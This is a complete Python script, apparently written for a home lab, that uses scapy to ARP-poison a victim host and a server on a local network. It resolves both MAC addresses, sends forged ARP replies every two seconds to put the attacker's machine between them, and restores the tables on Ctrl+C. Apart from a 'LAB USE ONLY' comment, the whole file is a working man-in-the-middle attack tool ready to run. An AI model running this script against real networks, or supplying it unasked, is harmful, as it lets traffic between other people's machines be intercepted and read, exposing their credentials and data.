#!/usr/bin/env python3
# arp_poison.py — LAB USE ONLY, isolated network, machines you own.
from scapy.all import ARP, send
import time, sys, signal, subprocess

VICTIM = "192.168.0.176"
SERVER = "192.168.0.241"

def getmac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True)
    out = subprocess.run(["ip", "neigh", "show", ip], capture_output=True, text=True).stdout
    for tok in out.split():
        if ":" in tok and len(tok) == 17:
            return tok
    return None

vmac, smac = getmac(VICTIM), getmac(SERVER)
print("victim MAC:", vmac, " server MAC:", smac)
if not vmac or not smac:
    sys.exit("Could not resolve MACs — check pings first.")
if vmac == smac:
    sys.exit("Victim and server resolved to the SAME MAC — addressing problem, stop and fix.")

def restore():
    send(ARP(op=2, pdst=VICTIM, hwdst=vmac, psrc=SERVER, hwsrc=smac), count=5, verbose=0)
    send(ARP(op=2, pdst=SERVER, hwdst=smac, psrc=VICTIM, hwsrc=vmac), count=5, verbose=0)

def stop(*a):
    print("\nRestoring ARP tables..."); restore(); sys.exit(0)

signal.signal(signal.SIGINT, stop)
print("Poisoning every 2s. Ctrl+C to stop and restore.")
while True:
    send(ARP(op=2, pdst=VICTIM, hwdst=vmac, psrc=SERVER), verbose=0)
    send(ARP(op=2, pdst=SERVER, hwdst=smac, psrc=VICTIM), verbose=0)
    time.sleep(2)